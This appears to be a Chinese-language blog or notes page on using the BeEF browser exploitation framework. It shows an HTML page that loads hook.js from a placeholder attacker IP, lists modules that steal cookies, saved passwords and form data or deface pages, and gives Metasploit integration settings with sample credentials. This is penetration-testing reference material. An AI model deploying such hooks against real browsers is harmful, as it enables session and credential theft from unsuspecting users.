---
title: "Beef"
date: 2016-03-16 17:09
---

## beef 简介

## beef 安装

## beef 使用

* 构造自己的hook html

只用将beef 提供的hook.js嵌入到自己构造的html页面就能作为可以hook的页面。

```
<!DOCTYPE html>
<html>
<head>
    <title>hook demo</title>
<script src="http://xxx.xxx.xxx.xxx:3000/hook.js"></script>
</head>
<body>

<p>This is a test</p>
</body>
</html>

```

* ./beef -h

```
Usage: beef [options]
    -x, --reset                      Reset the database
    -v, --verbose                    Display debug information
    -a, --ascii_art                  Prints BeEF ascii art
    -c, --config FILE                Load a different configuration file: if it's called custom-config.yaml, git automatically ignores it.
    -p, --port PORT                  Change the default BeEF listening port
    -w, --wsport WS_PORT             Change the default BeEF WebSocket listening port
    -i, --interactive                Starts with the Console Shell activated
```

## beef project 结构

## modules

modules 分为12类

每类里面最底层的方法构成: command.js, config.yaml, module.rb

* Browser

Hooked Domain

```
Fingerprint Ajax: Fingerprint Ajax and JS libraries present on the hooked page.
Create Alert Dialog: Sends an alert dialog to the hooked browser.
Clear Console: This module clears the Chrome developer console buffer.
Replace Content (Deface): Overwrite the page, title and shortcut icon on the hooked page.
Replace Component (Deface): Overwrite a particular component of the hooked page.
Disable Developer Tools: This module prevents users from executing JavaScript within the Internet Explorer Developer Tools console.
Get Cookie: This module will retrieve the session cookie from the current page.
Get Form Values: This module retrieves the name, type, and value of all input fields on the page.
Get Local Storage: Extracts data from the HTML5 localStorage object.
Get Page HTML: This module will retrieve the HTML from the current page.
Get Page and iframe HTML: This module will retrieve the HTML from the current page and any iframes (that have the same origin).
Get Page HREFs: This module will retrieve HREFs from the target page.
Get Session Storage: Extracts data from the HTML5 sessionStorage object.
Get Stored Credentials: This module retrieves saved username/password combinations from the login page on the hooked domain.<br /><br />It will fail if more than one set of domain credentials are saved in the browser.
Replace HREFs: This module will rewrite all the href attributes of all matched links.
Replace HREFs (Click Events): This module will rewrite all the href attributes of all matched links using Bilawal Hameed's updating of click event handling. This will hide the target site for all updated links.
Replace HREFs (HTTPS): This module will rewrite all the href attributes of HTTPS links to use HTTP instead of HTTPS. Links relative to the web root are not rewritten.
Replace HREFs (TEL): This module will rewrite all the href attributes of telephone links (ie, tel:5558585) to call a number of your choice.
iOS Address Bar Spoofing: Mobile Safari iOS 5.1 Address Bar Spoofing. This is fixed in latest version of Mobile Safari (the URL turns 'blank')
Overflow Cookie Jar: This module attempts to perform John Wilander's CookieJar overflow.  He demonstrated this in his <a href='https://www.owasp.org/index.php/OWASP_1-Liner'>Owasp 1-liner project</a>.  With this module, cookies that have the HTTPOnly-flag and/or HTTPS-flag can be wiped.  You can try to recreate these cookies afterwards as normal cookies.
Create Prompt Dialog: Sends a prompt dialog to the hooked browser.
Remove stuck iframe: This module will remove any stuck iframes (beware it will remove all of them on that node!).
Replace Videos: Replaces an object selected with jQuery (all embed tags by default) with an embed tag containing the youtube video of your choice (rickroll by default).
Redirect Browser (Rickroll): Overwrite the body of the page the victim is on with a full screen Rickroll.
Redirect Browser: This module will redirect the selected hooked browser to the address specified in the 'Redirect URL' input.
Redirect Browser (iFrame): This module creates a 100% x 100% overlaying iframe and keeps the browers hooked to the framework. The content of the iframe, page title, page shortcut icon and the time delay are specified in the parameters below.<br><br>The content of the URL bar will not be changed in the hooked browser.
```

## beef RESTful API

[RESTful API][1]

## extension

* metasploit

beef 根目录下修改 config.yaml 文件

```
extension:
        ......
        metasploit:
            enable: true
```

/beef/extensions/metasploit/config.yaml

```
    name: 'Metasploit'
    enable: true
    host: "127.0.0.1"
    port: 55552
    user: "msf"
    pass: "abc123"
    uri: '/api'
    ssl: true
    ssl_version: 'TLSv1'
    ssl_verify: true
    callback_host: "127.0.0.1"
    autopwn_url: "autopwn"
```

ip and callbak_host can be change to your host ip

then run in terminal

```
$msfconsole

msf> load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y

$./beef
```


[1]: https://github.com/beefproject/beef/wiki/BeEF-RESTful-API
